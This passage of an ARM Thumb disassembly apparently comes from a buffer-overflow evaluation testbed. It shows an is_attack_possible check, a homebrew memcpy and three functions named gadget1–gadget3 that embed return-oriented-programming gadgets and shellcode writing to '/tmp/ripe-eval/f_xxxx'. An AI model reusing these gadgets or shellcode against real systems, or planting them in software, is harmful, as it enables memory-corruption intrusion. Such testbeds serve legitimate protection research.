    c250:	429a      	cmp	r2, r3
    c252:	d115      	bne.n	c280 <is_attack_possible+0x338>
    c254:	f646 0350 	movw	r3, #26704	; 0x6850
    c258:	f2c0 0301 	movt	r3, #1
    c25c:	681b      	ldr	r3, [r3, #0]
    c25e:	2b00      	cmp	r3, #0
    c260:	d00c      	beq.n	c27c <is_attack_possible+0x334>
    c262:	f646 0360 	movw	r3, #26720	; 0x6860
    c266:	f2c0 0301 	movt	r3, #1
    c26a:	681b      	ldr	r3, [r3, #0]
    c26c:	f24d 5090 	movw	r0, #54672	; 0xd590
    c270:	f2c0 0000 	movt	r0, #0
    c274:	2101      	movs	r1, #1
    c276:	225c      	movs	r2, #92	; 0x5c
    c278:	f7fc eb64 	blx	8944 <_init+0xb0>
    c27c:	2300      	movs	r3, #0
    c27e:	e118      	b.n	c4b2 <is_attack_possible+0x56a>
    c280:	e0a3      	b.n	c3ca <is_attack_possible+0x482>
    c282:	f646 2388 	movw	r3, #27272	; 0x6a88
    c286:	f2c0 0301 	movt	r3, #1
    c28a:	681b      	ldr	r3, [r3, #0]
    c28c:	2b64      	cmp	r3, #100	; 0x64
    c28e:	f040 8085 	bne.w	c39c <is_attack_possible+0x454>
    c292:	f646 2388 	movw	r3, #27272	; 0x6a88
    c296:	f2c0 0301 	movt	r3, #1
    c29a:	689b      	ldr	r3, [r3, #8]
    c29c:	f5b3 7f96 	cmp.w	r3, #300	; 0x12c
    c2a0:	d066      	beq.n	c370 <is_attack_possible+0x428>
    c2a2:	f646 2388 	movw	r3, #27272	; 0x6a88
    c2a6:	f2c0 0301 	movt	r3, #1
    c2aa:	689a      	ldr	r2, [r3, #8]
    c2ac:	f240 132d 	movw	r3, #301	; 0x12d
    c2b0:	429a      	cmp	r2, r3
    c2b2:	d05d      	beq.n	c370 <is_attack_possible+0x428>
    c2b4:	f646 2388 	movw	r3, #27272	; 0x6a88
    c2b8:	f2c0 0301 	movt	r3, #1
    c2bc:	689b      	ldr	r3, [r3, #8]
    c2be:	f5b3 7f97 	cmp.w	r3, #302	; 0x12e
    c2c2:	d055      	beq.n	c370 <is_attack_possible+0x428>
    c2c4:	f646 2388 	movw	r3, #27272	; 0x6a88
    c2c8:	f2c0 0301 	movt	r3, #1
    c2cc:	689a      	ldr	r2, [r3, #8]
    c2ce:	f240 132f 	movw	r3, #303	; 0x12f
    c2d2:	429a      	cmp	r2, r3
    c2d4:	d04c      	beq.n	c370 <is_attack_possible+0x428>
    c2d6:	f646 2388 	movw	r3, #27272	; 0x6a88
    c2da:	f2c0 0301 	movt	r3, #1
    c2de:	689b      	ldr	r3, [r3, #8]
    c2e0:	f5b3 7f98 	cmp.w	r3, #304	; 0x130
    c2e4:	d044      	beq.n	c370 <is_attack_possible+0x428>
    c2e6:	f646 2388 	movw	r3, #27272	; 0x6a88
    c2ea:	f2c0 0301 	movt	r3, #1
    c2ee:	689a      	ldr	r2, [r3, #8]
    c2f0:	f240 1331 	movw	r3, #305	; 0x131
    c2f4:	429a      	cmp	r2, r3
    c2f6:	d03b      	beq.n	c370 <is_attack_possible+0x428>
    c2f8:	f646 2388 	movw	r3, #27272	; 0x6a88
    c2fc:	f2c0 0301 	movt	r3, #1
    c300:	689a      	ldr	r2, [r3, #8]
    c302:	f240 1333 	movw	r3, #307	; 0x133
    c306:	429a      	cmp	r2, r3
    c308:	d032      	beq.n	c370 <is_attack_possible+0x428>
    c30a:	f646 2388 	movw	r3, #27272	; 0x6a88
    c30e:	f2c0 0301 	movt	r3, #1
    c312:	689b      	ldr	r3, [r3, #8]
    c314:	f5b3 7f9a 	cmp.w	r3, #308	; 0x134
    c318:	d02a      	beq.n	c370 <is_attack_possible+0x428>
    c31a:	f646 2388 	movw	r3, #27272	; 0x6a88
    c31e:	f2c0 0301 	movt	r3, #1
    c322:	689a      	ldr	r2, [r3, #8]
    c324:	f240 1335 	movw	r3, #309	; 0x135
    c328:	429a      	cmp	r2, r3
    c32a:	d021      	beq.n	c370 <is_attack_possible+0x428>
    c32c:	f646 2388 	movw	r3, #27272	; 0x6a88
    c330:	f2c0 0301 	movt	r3, #1
    c334:	689b      	ldr	r3, [r3, #8]
    c336:	f5b3 7f9b 	cmp.w	r3, #310	; 0x136
    c33a:	d019      	beq.n	c370 <is_attack_possible+0x428>
    c33c:	f646 2388 	movw	r3, #27272	; 0x6a88
    c340:	f2c0 0301 	movt	r3, #1
    c344:	689b      	ldr	r3, [r3, #8]
    c346:	f5b3 7f9c 	cmp.w	r3, #312	; 0x138
    c34a:	d011      	beq.n	c370 <is_attack_possible+0x428>
    c34c:	f646 2388 	movw	r3, #27272	; 0x6a88
    c350:	f2c0 0301 	movt	r3, #1
    c354:	689a      	ldr	r2, [r3, #8]
    c356:	f240 1339 	movw	r3, #313	; 0x139
    c35a:	429a      	cmp	r2, r3
    c35c:	d008      	beq.n	c370 <is_attack_possible+0x428>
    c35e:	f646 2388 	movw	r3, #27272	; 0x6a88
    c362:	f2c0 0301 	movt	r3, #1
    c366:	689a      	ldr	r2, [r3, #8]
    c368:	f240 133b 	movw	r3, #315	; 0x13b
    c36c:	429a      	cmp	r2, r3
    c36e:	d115      	bne.n	c39c <is_attack_possible+0x454>
    c370:	f646 0350 	movw	r3, #26704	; 0x6850
    c374:	f2c0 0301 	movt	r3, #1
    c378:	681b      	ldr	r3, [r3, #0]
    c37a:	2b00      	cmp	r3, #0
    c37c:	d00c      	beq.n	c398 <is_attack_possible+0x450>
    c37e:	f646 0360 	movw	r3, #26720	; 0x6860
    c382:	f2c0 0301 	movt	r3, #1
    c386:	681b      	ldr	r3, [r3, #0]
    c388:	f24d 50f0 	movw	r0, #54768	; 0xd5f0
    c38c:	f2c0 0000 	movt	r0, #0
    c390:	2101      	movs	r1, #1
    c392:	225e      	movs	r2, #94	; 0x5e
    c394:	f7fc ead6 	blx	8944 <_init+0xb0>
    c398:	2300      	movs	r3, #0
    c39a:	e08a      	b.n	c4b2 <is_attack_possible+0x56a>
    c39c:	e015      	b.n	c3ca <is_attack_possible+0x482>
    c39e:	f646 0350 	movw	r3, #26704	; 0x6850
    c3a2:	f2c0 0301 	movt	r3, #1
    c3a6:	681b      	ldr	r3, [r3, #0]
    c3a8:	2b00      	cmp	r3, #0
    c3aa:	d00c      	beq.n	c3c6 <is_attack_possible+0x47e>
    c3ac:	f646 0360 	movw	r3, #26720	; 0x6860
    c3b0:	f2c0 0301 	movt	r3, #1
    c3b4:	681b      	ldr	r3, [r3, #0]
    c3b6:	f24d 6050 	movw	r0, #54864	; 0xd650
    c3ba:	f2c0 0000 	movt	r0, #0
    c3be:	2101      	movs	r1, #1
    c3c0:	2229      	movs	r2, #41	; 0x29
    c3c2:	f7fc eac0 	blx	8944 <_init+0xb0>
    c3c6:	2300      	movs	r3, #0
    c3c8:	e073      	b.n	c4b2 <is_attack_possible+0x56a>
    c3ca:	f646 2388 	movw	r3, #27272	; 0x6a88
    c3ce:	f2c0 0301 	movt	r3, #1
    c3d2:	681b      	ldr	r3, [r3, #0]
    c3d4:	2b65      	cmp	r3, #101	; 0x65
    c3d6:	d125      	bne.n	c424 <is_attack_possible+0x4dc>
    c3d8:	f646 2388 	movw	r3, #27272	; 0x6a88
    c3dc:	f2c0 0301 	movt	r3, #1
    c3e0:	685b      	ldr	r3, [r3, #4]
    c3e2:	2bcb      	cmp	r3, #203	; 0xcb
    c3e4:	d11e      	bne.n	c424 <is_attack_possible+0x4dc>
    c3e6:	f646 2388 	movw	r3, #27272	; 0x6a88
    c3ea:	f2c0 0301 	movt	r3, #1
    c3ee:	689a      	ldr	r2, [r3, #8]
    c3f0:	f240 132d 	movw	r3, #301	; 0x12d
    c3f4:	429a      	cmp	r2, r3
    c3f6:	d015      	beq.n	c424 <is_attack_possible+0x4dc>
    c3f8:	f646 0350 	movw	r3, #26704	; 0x6850
    c3fc:	f2c0 0301 	movt	r3, #1
    c400:	681b      	ldr	r3, [r3, #0]
    c402:	2b00      	cmp	r3, #0
    c404:	d00c      	beq.n	c420 <is_attack_possible+0x4d8>
    c406:	f646 0360 	movw	r3, #26720	; 0x6860
    c40a:	f2c0 0301 	movt	r3, #1
    c40e:	681b      	ldr	r3, [r3, #0]
    c410:	f24d 607c 	movw	r0, #54908	; 0xd67c
    c414:	f2c0 0000 	movt	r0, #0
    c418:	2101      	movs	r1, #1
    c41a:	227c      	movs	r2, #124	; 0x7c
    c41c:	f7fc ea92 	blx	8944 <_init+0xb0>
    c420:	2300      	movs	r3, #0
    c422:	e046      	b.n	c4b2 <is_attack_possible+0x56a>
    c424:	f646 2388 	movw	r3, #27272	; 0x6a88
    c428:	f2c0 0301 	movt	r3, #1
    c42c:	689b      	ldr	r3, [r3, #8]
    c42e:	f5a3 739c 	sub.w	r3, r3, #312	; 0x138
    c432:	2b03      	cmp	r3, #3
    c434:	d816      	bhi.n	c464 <is_attack_possible+0x51c>
    c436:	f646 2388 	movw	r3, #27272	; 0x6a88
    c43a:	f2c0 0301 	movt	r3, #1
    c43e:	681b      	ldr	r3, [r3, #0]
    c440:	2b64      	cmp	r3, #100	; 0x64
    c442:	d00e      	beq.n	c462 <is_attack_possible+0x51a>
    c444:	f646 0360 	movw	r3, #26720	; 0x6860
    c448:	f2c0 0301 	movt	r3, #1
    c44c:	681b      	ldr	r3, [r3, #0]
    c44e:	f24d 60fc 	movw	r0, #55036	; 0xd6fc
    c452:	f2c0 0000 	movt	r0, #0
    c456:	2101      	movs	r1, #1
    c458:	2228      	movs	r2, #40	; 0x28
    c45a:	f7fc ea74 	blx	8944 <_init+0xb0>
    c45e:	2300      	movs	r3, #0
    c460:	e027      	b.n	c4b2 <is_attack_possible+0x56a>
    c462:	e000      	b.n	c466 <is_attack_possible+0x51e>
    c464:	bf00      	nop
    c466:	f646 2388 	movw	r3, #27272	; 0x6a88
    c46a:	f2c0 0301 	movt	r3, #1
    c46e:	685b      	ldr	r3, [r3, #4]
    c470:	2bcd      	cmp	r3, #205	; 0xcd
    c472:	d11d      	bne.n	c4b0 <is_attack_possible+0x568>
    c474:	f646 2388 	movw	r3, #27272	; 0x6a88
    c478:	f2c0 0301 	movt	r3, #1
    c47c:	681b      	ldr	r3, [r3, #0]
    c47e:	2b64      	cmp	r3, #100	; 0x64
    c480:	d107      	bne.n	c492 <is_attack_possible+0x54a>
    c482:	f646 2388 	movw	r3, #27272	; 0x6a88
    c486:	f2c0 0301 	movt	r3, #1
    c48a:	689b      	ldr	r3, [r3, #8]
    c48c:	f5b3 7f96 	cmp.w	r3, #300	; 0x12c
    c490:	d00e      	beq.n	c4b0 <is_attack_possible+0x568>
    c492:	f646 0360 	movw	r3, #26720	; 0x6860
    c496:	f2c0 0301 	movt	r3, #1
    c49a:	681b      	ldr	r3, [r3, #0]
    c49c:	f24d 60fc 	movw	r0, #55036	; 0xd6fc
    c4a0:	f2c0 0000 	movt	r0, #0
    c4a4:	2101      	movs	r1, #1
    c4a6:	2228      	movs	r2, #40	; 0x28
    c4a8:	f7fc ea4c 	blx	8944 <_init+0xb0>
    c4ac:	2300      	movs	r3, #0
    c4ae:	e000      	b.n	c4b2 <is_attack_possible+0x56a>
    c4b0:	2301      	movs	r3, #1
    c4b2:	4618      	mov	r0, r3
    c4b4:	bd80      	pop	{r7, pc}
    c4b6:	bf00      	nop

0000c4b8 <homebrew_memcpy>:
    c4b8:	b480      	push	{r7}
    c4ba:	b087      	sub	sp, #28
    c4bc:	af00      	add	r7, sp, #0
    c4be:	60f8      	str	r0, [r7, #12]
    c4c0:	60b9      	str	r1, [r7, #8]
    c4c2:	607a      	str	r2, [r7, #4]
    c4c4:	68fb      	ldr	r3, [r7, #12]
    c4c6:	617b      	str	r3, [r7, #20]
    c4c8:	68bb      	ldr	r3, [r7, #8]
    c4ca:	613b      	str	r3, [r7, #16]
    c4cc:	e007      	b.n	c4de <homebrew_memcpy+0x26>
    c4ce:	697b      	ldr	r3, [r7, #20]
    c4d0:	1c5a      	adds	r2, r3, #1
    c4d2:	617a      	str	r2, [r7, #20]
    c4d4:	693a      	ldr	r2, [r7, #16]
    c4d6:	1c51      	adds	r1, r2, #1
    c4d8:	6139      	str	r1, [r7, #16]
    c4da:	7812      	ldrb	r2, [r2, #0]
    c4dc:	701a      	strb	r2, [r3, #0]
    c4de:	687b      	ldr	r3, [r7, #4]
    c4e0:	1e5a      	subs	r2, r3, #1
    c4e2:	607a      	str	r2, [r7, #4]
    c4e4:	2b00      	cmp	r3, #0
    c4e6:	d1f2      	bne.n	c4ce <homebrew_memcpy+0x16>
    c4e8:	371c      	adds	r7, #28
    c4ea:	46bd      	mov	sp, r7
    c4ec:	f85d 7b04 	ldr.w	r7, [sp], #4
    c4f0:	4770      	bx	lr
    c4f2:	bf00      	nop

0000c4f4 <gadget1>:
    c4f4:	b480      	push	{r7}
    c4f6:	b085      	sub	sp, #20
    c4f8:	af00      	add	r7, sp, #0
    c4fa:	6078      	str	r0, [r7, #4]
    c4fc:	6039      	str	r1, [r7, #0]
    c4fe:	683a      	ldr	r2, [r7, #0]
    c500:	f640 4331 	movw	r3, #3121	; 0xc31
    c504:	f2c3 03c3 	movt	r3, #12483	; 0x30c3
    c508:	fb83 1302 	smull	r1, r3, r3, r2
    c50c:	10d9      	asrs	r1, r3, #3
    c50e:	17d3      	asrs	r3, r2, #31
    c510:	1aca      	subs	r2, r1, r3
    c512:	687b      	ldr	r3, [r7, #4]
    c514:	4413      	add	r3, r2
    c516:	60bb      	str	r3, [r7, #8]
    c518:	2300      	movs	r3, #0
    c51a:	60fb      	str	r3, [r7, #12]
    c51c:	e002      	b.n	c524 <gadget1+0x30>
    c51e:	68fb      	ldr	r3, [r7, #12]
    c520:	3301      	adds	r3, #1
    c522:	60fb      	str	r3, [r7, #12]
    c524:	68fb      	ldr	r3, [r7, #12]
    c526:	2b09      	cmp	r3, #9
    c528:	ddf9      	ble.n	c51e <gadget1+0x2a>
    c52a:	bf00      	nop
    c52c:	447e      	add	r6, pc
    c52e:	4730      	bx	r6
    c530:	4678      	mov	r0, pc
    c532:	3010      	adds	r0, #16
    c534:	21ff      	movs	r1, #255	; 0xff
    c536:	31ff      	adds	r1, #255	; 0xff
    c538:	3001      	adds	r0, #1
    c53a:	3708      	adds	r7, #8
    c53c:	df01      	svc	1
    c53e:	4040      	eors	r0, r0
    c540:	2701      	movs	r7, #1
    c542:	df01      	svc	1
    c544:	706d742f 	.word	0x706d742f
    c548:	7069722f 	.word	0x7069722f
    c54c:	6176652d 	.word	0x6176652d
    c550:	5f662f6c 	.word	0x5f662f6c
    c554:	78787878 	.word	0x78787878
    c558:	bf00      	nop
    c55a:	3714      	adds	r7, #20
    c55c:	46bd      	mov	sp, r7
    c55e:	f85d 7b04 	ldr.w	r7, [sp], #4
    c562:	4770      	bx	lr

0000c564 <gadget2>:
    c564:	b480      	push	{r7}
    c566:	b085      	sub	sp, #20
    c568:	af00      	add	r7, sp, #0
    c56a:	6078      	str	r0, [r7, #4]
    c56c:	6039      	str	r1, [r7, #0]
    c56e:	683a      	ldr	r2, [r7, #0]
    c570:	f64b 6383 	movw	r3, #48771	; 0xbe83
    c574:	f6c2 73a0 	movt	r3, #12192	; 0x2fa0
    c578:	fb83 1302 	smull	r1, r3, r3, r2
    c57c:	10d9      	asrs	r1, r3, #3
    c57e:	17d3      	asrs	r3, r2, #31
    c580:	1aca      	subs	r2, r1, r3
    c582:	687b      	ldr	r3, [r7, #4]
    c584:	4413      	add	r3, r2
    c586:	60bb      	str	r3, [r7, #8]
    c588:	2300      	movs	r3, #0
    c58a:	60fb      	str	r3, [r7, #12]
    c58c:	e002      	b.n	c594 <gadget2+0x30>
    c58e:	68fb      	ldr	r3, [r7, #12]
    c590:	3301      	adds	r3, #1
    c592:	60fb      	str	r3, [r7, #12]
    c594:	68fb      	ldr	r3, [r7, #12]
    c596:	2b09      	cmp	r3, #9
    c598:	ddf9      	ble.n	c58e <gadget2+0x2a>
    c59a:	bf00      	nop
    c59c:	bc04      	pop	{r2}
    c59e:	bc08      	pop	{r3}
    c5a0:	3302      	adds	r3, #2
    c5a2:	f85d 7b04 	ldr.w	r7, [sp], #4
    c5a6:	4770      	bx	lr
    c5a8:	bf00      	nop
    c5aa:	3714      	adds	r7, #20
    c5ac:	46bd      	mov	sp, r7
    c5ae:	f85d 7b04 	ldr.w	r7, [sp], #4
    c5b2:	4770      	bx	lr

0000c5b4 <gadget3>:
    c5b4:	b480      	push	{r7}
    c5b6:	b085      	sub	sp, #20
    c5b8:	af00      	add	r7, sp, #0
    c5ba:	6078      	str	r0, [r7, #4]
    c5bc:	6039      	str	r1, [r7, #0]
    c5be:	683a      	ldr	r2, [r7, #0]
    c5c0:	f248 33e1 	movw	r3, #33761	; 0x83e1
    c5c4:	f6c3 630f 	movt	r3, #15887	; 0x3e0f
    c5c8:	fb83 1302 	smull	r1, r3, r3, r2
    c5cc:	10d9      	asrs	r1, r3, #3
    c5ce:	17d3      	asrs	r3, r2, #31
    c5d0:	1aca      	subs	r2, r1, r3
    c5d2:	687b      	ldr	r3, [r7, #4]
    c5d4:	4413      	add	r3, r2
    c5d6:	60bb      	str	r3, [r7, #8]
    c5d8:	2300      	movs	r3, #0
    c5da:	60fb      	str	r3, [r7, #12]
    c5dc:	e002      	b.n	c5e4 <gadget3+0x30>
    c5de:	68fb      	ldr	r3, [r7, #12]
    c5e0:	3301      	adds	r3, #1
    c5e2:	60fb      	str	r3, [r7, #12]
    c5e4:	68fb      	ldr	r3, [r7, #12]
    c5e6:	2b09      	cmp	r3, #9
    c5e8:	ddf9      	ble.n	c5de <gadget3+0x2a>
    c5ea:	bf00      	nop
    c5ec:	f85d 7b04 	ldr.w	r7, [sp], #4
    c5f0:	4770      	bx	lr
    c5f2:	232a      	movs	r3, #42	; 0x2a
    c5f4:	4618      	mov	r0, r3
    c5f6:	3714      	adds	r7, #20
    c5f8:	46bd      	mov	sp, r7
    c5fa:	f85d 7b04 	ldr.w	r7, [sp], #4
    c5fe:	4770      	bx	lr

0000c600 <__libc_csu_init>:
    c600:	e92d 43f8 	stmdb	sp!, {r3, r4, r5, r6, r7, r8, r9, lr}
    c604:	4607      	mov	r7, r0
    c606:	4e0c      	ldr	r6, [pc, #48]	; (c638 <__libc_csu_init+0x38>)
    c608:	4688      	mov	r8, r1
    c60a:	4d0c      	ldr	r5, [pc, #48]	; (c63c <__libc_csu_init+0x3c>)
    c60c:	4691      	mov	r9, r2
    c60e:	447e      	add	r6, pc
    c610:	f7fc e940 	blx	8894 <_init>
    c614:	447d      	add	r5, pc
    c616:	1b76      	subs	r6, r6, r5
    c618:	10b6      	asrs	r6, r6, #2
    c61a:	d00a      	beq.n	c632 <__libc_csu_init+0x32>
    c61c:	3d04      	subs	r5, #4
    c61e:	2400      	movs	r4, #0
    c620:	3401      	adds	r4, #1
    c622:	f855 3f04 	ldr.w	r3, [r5, #4]!
    c626:	4638      	mov	r0, r7
    c628:	4641      	mov	r1, r8
    c62a:	464a      	mov	r2, r9
    c62c:	4798      	blx	r3
    c62e:	42b4      	cmp	r4, r6
    c630:	d1f6      	bne.n	c620 <__libc_csu_init+0x20>
    c632:	e8bd 83f8 	ldmia.w	sp!, {r3, r4, r5, r6, r7, r8, r9, pc}
    c636:	bf00      	nop
    c638:	000098fe 	.word	0x000098fe
    c63c:	000098f4 	.word	0x000098f4

0000c640 <__libc_csu_fini>:
    c640:	4770      	bx	lr
    c642:	bf00      	nop

Disassembly of section .fini:

0000c644 <_fini>:
    c644:	e92d4008 	push	{r3, lr}
    c648:	e8bd8008 	pop	{r3, pc}
